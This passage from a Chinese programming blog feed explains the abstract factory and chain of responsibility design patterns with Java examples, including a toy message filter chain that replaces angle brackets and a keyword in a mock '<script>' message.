class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Act</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title">act</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br>Food<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Food</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title">eat</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br>Vehicle<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vehicle</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title">go</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>接着我们再将Car、Bread、Smoking继承Vehicle、Food、Act三个抽象方法。<br>此时是不是就很明确了。接着我们再创建一个实体类来实现原始人这一族</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">TestFactory<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestFactory</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractFactory</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function">Food <span class="hljs-title">createFood</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Meat();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function">Act <span class="hljs-title">createAct</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Drinking();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function">Vehicle <span class="hljs-title">createVehicle</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Pig();<br>    &#125;<br>&#125;<br><br>Main<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        AbstractFactory af = <span class="hljs-keyword">new</span> TestFactory();<br><br>        Vehicle pig = af.createVehicle();<br>        pig.go();<br>        Food meat = af.createFood();<br>        meat.eat();<br>        Act drinking = af.createAct();<br>        drinking.act();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>此时我们并不需要改动大量的代码，只需将<br><code>AbstractFactory af = new TestFactory();</code> TestFactory()改为我们所需要用到的工厂即可。</p>
<p>工厂方法比较方便在于产品单一维度上的扩展，只需加新产品加工厂<br>而抽象工厂在产品族上扩展时，方便在于产品族的扩展，但是在产品单一维度上扩展时，你的抽象工厂需要加方法，具体工厂要加更多的方法</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>简单工厂：唯一工厂类，一个产品抽象类，工厂类的创建方法依据入参判断并创建具体产品对象。<br>工厂方法：多个工厂类，一个产品抽象类，利用多态创建不同的产品对象，避免了大量的if-else判断。<br>抽象工厂：多个工厂类，多个产品抽象类，产品子类分组，同一个工厂实现类创建同组中的不同产品，减少了工厂子类的数量。</p>
<p>参考文章：<br><a href="https://www.zhihu.com/question/27125796/answer/1615074467" target="_blank" rel="noopener">简单工厂模式、工厂方法模式和抽象工厂模式有何区别？</a></p>
</font>]]></content>
      <categories>
        <category>程序猿</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式6-ChainOfResponsibility</title>
    <url>/article/d6938380.html</url>
    <content><![CDATA[<p>责任链模式算是设计模式中比较难的模式了，所以这里会比较详细的介绍一下这个模式。</p>
<h2 id="责任链模式"><a href="#责任链模式" class="headerlink" title=" 责任链模式"></a><a href="https://www.runoob.com/design-pattern/decorator-pattern.html" target="_blank" rel="noopener"> 责任链模式</a></h2><p><font size="4" face="PingFang SC">&emsp;&emsp;顾名思义，责任链模式（Chain of Responsibility Pattern）为请求创建了一个接收者对象的链。这种模式给予请求的类型，对请求的发送者和接收者进行解耦。这种类型的设计模式属于<font color="#FFB6C1" size="5" face="Open Sans"> 行为型模式 </font>。</p>
<p>在这种模式中，通常每个接收者都包含对另一个接收者的引用。如果一个对象不能处理该请求，那么它会把相同的请求传给下一个接收者，依此类推。结构型模式 </p>
<p>如果想了解责任链模式模式的具体的介绍，菜鸟教程介绍得比较详细↓<br><a href="https://www.runoob.com/design-pattern/chain-of-responsibility-pattern.html" target="_blank" rel="noopener" class="LinkCard">菜鸟教程-责任链模式<br></a></p>
<h2 id="结构图"><a href="#结构图" class="headerlink" title="结构图"></a>结构图</h2><p><img src="https://qiniuyun.fxhstudy.com/%E8%B4%A3%E4%BB%BB%E9%93%BE%E6%A8%A1%E5%BC%8F1.png" srcset="/img/loading.gif" title="责任链模式"><br></p>
<h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><p>优点：<br>1、降低耦合度。它将请求的发送者和接收者解耦。<br>2、简化了对象。使得对象不需要知道链的结构。<br>3、增强给对象指派职责的灵活性。通过改变链内的成员或者调动它们的次序，允许动态地新增或者删除责任。<br>4、增加新的请求处理类很方便。</p>
<p>缺点：<br>1、不能保证请求一定被接收。<br>2、系统性能将受到一定影响，而且在进行代码调试时不太方便，可能会造成循环调用。<br>3、可能不容易观察运行时的特征，有碍于除错。</p>
<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>1、有多个对象可以处理同一个请求，具体哪个对象处理该请求由运行时刻自动确定。<br>2、在不明确指定接收者的情况下，向多个对象中的一个提交一个请求。<br>3、可动态指定一组对象处理请求。</p>
<h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><p>提出需求，有一些基础的应该知道，客户端在向服务端发送请求的时候，是存在过滤的(为什么要过滤?为了防止黑客攻击，例如xss)。<br>而这次我们提出的需求就是，用户在向服务器端提交的时候，我们对提交的东西，进行匹配替换。</p>
<p>简单代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Code1<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Msg</span></span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String msg;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getMsg</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> msg;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setMsg</span><span class="hljs-params">(String msg)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.msg = msg;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">"Msg&#123;"</span> +<br>                <span class="hljs-string">"name='"</span> + name + <span class="hljs-string">'\''</span> +<br>                <span class="hljs-string">", msg='"</span> + msg + <span class="hljs-string">'\''</span> +<br>                <span class="hljs-string">'&#125;'</span>;<br>    &#125;<br>&#125;<br><br>Main<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Msg msg = <span class="hljs-keyword">new</span> Msg();<br>        msg.setMsg(<span class="hljs-string">"插播一条消息&lt;script&gt;:本网站已经被我Hacker了,交钱信息不外漏:)，联系方式:xf.com"</span>);<br><br>        <span class="hljs-comment">//处理msg</span><br>       String r = msg.getMsg();<br>       r = r.replace(<span class="hljs-string">'&lt;'</span>, <span class="hljs-string">'['</span>);<br>       r = r.replace(<span class="hljs-string">'&gt;'</span>, <span class="hljs-string">']'</span>);<br>       r = r.replaceAll(<span class="hljs-string">"Hacker"</span>, <span class="hljs-string">" "</span>);<br>       msg.setMsg(r);<br>       System.out.println(msg);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>结果如下:</p>
<figure class="highlight cmd"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmd">Msg&#123;name='null', msg='插播一条消息[script]:本网站已经被我 了,交钱信息不外漏:)，联系方式:xf.com'&#125;<br></code></pre></div></td></tr></table></figure>

<p>但弊端也是很明显的，对于过滤这个动作不确定，可能以后会再添加其他的过滤，这时候该怎么做呢？<br>第一反应肯定是直接在后面添加过滤语句，这一定是可以的。但是这里的代码其实是很简单，真正的业务可能每一步都很复杂，例如过滤字符串可能要过滤很多<br>如果将所有代码都写在一块，首先非常乱，其次不容易扩展。<br>软件可扩展性指添加新功能的时候，对原来的软件架构改动越少，说明扩展性越好<br>封装-&gt;变化(要处理的逻辑，这里是要处理的字符串的逻辑可能会变)</p>
<p>解决思路是，前面学过了这么多模式，不难想出，我们将过滤这个动作封装成一个接口，里面含有过滤方法。<br>然后将不同的过滤机制实现这个接口</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Code2<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Msg</span></span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String msg;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getMsg</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> msg;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setMsg</span><span class="hljs-params">(String msg)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.msg = msg;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">"Msg&#123;"</span> +<br>                <span class="hljs-string">"name='"</span> + name + <span class="hljs-string">'\''</span> +<br>                <span class="hljs-string">", msg='"</span> + msg + <span class="hljs-string">'\''</span> +<br>                <span class="hljs-string">'&#125;'</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Filter</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(Msg msg)</span></span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HTMLFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(Msg msg)</span> </span>&#123;<br>        String r = msg.getMsg();<br>        r = r.replace(<span class="hljs-string">'&lt;'</span>, <span class="hljs-string">'['</span>);<br>        r = r.replace(<span class="hljs-string">'&gt;'</span>, <span class="hljs-string">']'</span>);<br>        msg.setMsg(r);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SensitiveFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(Msg msg)</span> </span>&#123;<br>        String r = msg.getMsg();<br>        r = r.replaceAll(<span class="hljs-string">"Hacker"</span>, <span class="hljs-string">" "</span>);<br>        msg.setMsg(r);<br>    &#125;<br>&#125;<br><br>Main<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Msg msg = <span class="hljs-keyword">new</span> Msg();<br>        msg.setMsg(<span class="hljs-string">"插播一条消息&lt;script&gt;:本网站已经被我Hacker了,交钱信息不外漏:)，联系方式:xf.com"</span>);<br><br>        <span class="hljs-comment">//处理msg</span><br>       List&lt;Filter&gt; filters = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>       filters.add(<span class="hljs-keyword">new</span> HTMLFilter());<br>       filters.add(<span class="hljs-keyword">new</span> SensitiveFilter());<br><br>       <span class="hljs-keyword">for</span> (Filter filter : filters) &#123;<br>           filter.doFilter(msg);<br>       &#125;<br>       System.out.println(msg);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>输出</p>
<figure class="highlight cmd"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmd">Msg&#123;name='null', msg='插播一条消息[script]:本网站已经被我 了,交钱信息不外漏:)，联系方式:xf.com'&#125;<br></code></pre></div></td></tr></table></figure>

<p>现在，这些过滤就可以看出是一条责任链</p>
<p><img src="https://qiniuyun.fxhstudy.com/ChainOfResponsibility3.png" srcset="/img/loading.gif"><br></p>
<p>这里我们再完善一下代码:</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Code3<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Msg</span></span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String msg;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getMsg</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> msg;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setMsg</span><span class="hljs-params">(String msg)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.msg = msg;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">"Msg&#123;"</span> +<br>                <span class="hljs-string">"name='"</span> + name + <span class="hljs-string">'\''</span> +<br>                <span class="hljs-string">", msg='"</span> + msg + <span class="hljs-string">'\''</span> +<br>                <span class="hljs-string">'&#125;'</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Filter</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(Msg msg)</span></span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HTMLFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(Msg msg)</span> </span>&#123;<br>        String r = msg.getMsg();<br>        r = r.replace(<span class="hljs-string">'&lt;'</span>, <span class="hljs-string">'['</span>);<br>        r = r.replace(<span class="hljs-string">'&gt;'</span>, <span class="hljs-string">']'</span>);<br>        msg.setMsg(r);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SensitiveFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(Msg msg)</span> </span>&#123;<br>        String r = msg.getMsg();<br>        r = r.replaceAll(<span class="hljs-string">"Hacker"</span>, <span class="hljs-string">" "</span>);<br>        msg.setMsg(r);<br>    &#125;<br>&#125;<br><br>FilterChain<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FilterChain</span></span>&#123;<br>    List&lt;Filter&gt; filters = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br><br>    <span class="hljs-comment">/*public void add(Filter filter)&#123;<br>        filters.add(filter);<br>    &#125;*/</span><br>    <span class="hljs-comment">//这里注意，这个是编程的一个小技巧，这里返回FilterChain的话，</span><br>    <span class="hljs-comment">//那么可以将代码写出链式编程:</span><br>    <span class="hljs-comment">//fc.add(new HTMLFilter()).add(new SensitiveFilter());</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> FilterChain <span class="hljs-title">add</span><span class="hljs-params">(Filter filter)</span></span>&#123;<br>        filters.add(filter);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(Msg msg)</span></span>&#123;<br>        <span class="hljs-keyword">for</span> (Filter f :<br>                filters) &#123;<br>            f.doFilter(msg);<br>        &#125;<br>    &#125;<br>&#125;<br><br>Main<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Msg msg = <span class="hljs-keyword">new</span> Msg();<br>        msg.setMsg(<span class="hljs-string">"插播一条消息&lt;script&gt;:本网站已经被我Hacker了,交钱信息不外漏:)，联系方式:xf.com"</span>);<br><br>        <span class="hljs-comment">//处理msg</span><br>        FilterChain fc = <span class="hljs-keyword">new</span> FilterChain();<br>        <span class="hljs-comment">/*fc.add(new HTMLFilter());<br>        fc.add(new SensitiveFilter());*/</span><br>        <span class="hljs-comment">// 编程小技巧,将返回值改为FilterChain类型</span><br>        fc.add(<span class="hljs-keyword">new</span> HTMLFilter())<br>                .add(<span class="hljs-keyword">new</span> SensitiveFilter());<br><br>        System.out.println(msg);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>Code2和Code3的区别并不大，但Code3的代码，实用性更高。</p>
<p>我们知道在过滤的时候肯定不止一条链对于数据的处理，实际上应该是多条链。那如何将这多条链同时来处理一条数据呢？<br>这里我们让FilterChain也实现Filter接口，这样我们就可以通过add()方法，将多条链链接在一起。<br>而此时就可以看出Code2和Code3之间的差距了</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Code4<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Msg</span></span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String msg;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span 